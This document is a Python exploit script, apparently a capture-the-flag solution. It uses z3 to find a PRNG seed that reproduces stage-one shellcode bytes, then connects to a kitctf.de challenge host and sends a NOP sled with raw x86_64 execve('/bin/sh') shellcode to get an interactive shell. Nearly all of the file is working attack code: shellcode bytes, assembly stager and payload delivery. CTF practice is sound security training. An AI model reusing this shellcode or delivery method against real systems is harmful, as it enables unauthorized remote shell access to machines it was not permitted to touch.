
import time
import pwn
import z3


def ROTL(X, N):
    return ((((X) << (N)) | ((X) >> (64 - (N)))) % (2 ** 64))

def ROTR(X, N):
    return ((((X) >> (N)) | ((X) << (64 - (N)))) % (2 ** 64))

def custom_random(state):
    NEW_STATE = ROTL(state,30) ^ ROTR(state,12) ^ ROTL(state,42) ^ ROTL(state,4) ^ ROTR(state,5);
    return NEW_STATE % 256, NEW_STATE;


pwn.context.arch = 'x86_64'


shc = pwn.asm("""
    pop rdx;
    push rdi;
    xor edi, edi;
    pop rsi;
    xor eax, eax;
    syscall
""")

def get_values():

    print(f'{len(shc)=}')

    first_val = pwn.u32(shc[:4])
    print(f'{first_val=}')

    seed = z3.BitVec('x', 128)

    solver = z3.Solver()
    cs = seed % (2 ** 64)

    for v in shc[4:]:
        b, cs = custom_random(cs)
        solver.add(b == v)

    print("Trying to solve...")
    print(solver.check())

    m = solver.model()

    second_val = m.eval(seed).as_long() % (2 ** 64)
    print(f'{second_val=}')
    return first_val, second_val

first_val, second_val = get_values()
#first_val, second_val = 4281423706, 8811456967659335293



cs = second_val

for v in shc[4:]:
    b, cs = custom_random(cs)
    assert b == v


#r = pwn.remote("localhost", 1337)
r = pwn.remote("tusa--nicki-minaj-7542.ctf.kitctf.de", "443", ssl=True)

r.recvuntil(b"at ")

win = int(r.recvline().strip().decode(), 16)

r.sendline(str(second_val).encode())
r.recvuntil(b"?")

r.sendline(str(first_val).encode())


_shc = bytearray([
    0x48, 0x31, 0xd2, 0x48, 0xbb, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb,
    0x08, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f,
    0x05, 0x6a, 0x01, 0x5f, 0x6a, 0x3c, 0x58, 0x0f, 0x05
])

time.sleep(.3)

r.send(b'\x90' * (0x10 + len(shc)-4) + _shc)

r.interactive()

